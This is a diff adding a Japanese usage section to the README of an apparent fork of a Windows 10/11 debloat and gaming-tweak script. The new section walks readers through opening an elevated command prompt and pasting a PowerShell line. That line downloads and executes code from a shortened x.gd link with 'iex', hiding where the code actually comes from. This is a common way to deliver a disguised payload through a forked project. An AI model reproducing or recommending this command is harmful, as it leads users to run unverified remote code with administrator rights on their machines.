@@ -1,4 +1,20 @@
-# WindowsGamingFocus
+# 使い方
+管理権限でコマンド画面を開きコマンドを貼り付けます。　以下の手順で実施します。
+
+1. [Win]キー + R で[ファイル名を指定して実行]を開きます。
+2. 「cmd」と入力します。
+3. [Shift]+[CTRL]を押しながら[Enter]を押します。
+4. [このアプリが変更を加えることを許可しますか]で[はい]を選択します。
+5. 下記のコマンドをコピーし、コマンド画面に張り付けて[Enter]を押します。
+```
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://x.gd/49Xub')"
+```
+
+以降はFork元から変更なしです
+
+↓
+
+# Windows10GamingFocus
 This is A FORK Based On ChrisTitusTech that's foucus on debloat and optimize windows 10/11 for the lowest latency and best gaming experience, the Ultimate Windows 10/11 Script is a creation from multiple debloat scripts and gists from github. I also added Chocolatey and other tools to the script that I install on every machine.
 ```
 Warrning: I am NOT responsible for what you do to your Devices/Systems, so follow these instructions at your own risk. Make sure you know what you're doing, it's best to understand the process rather than just copy and paste commands and such.
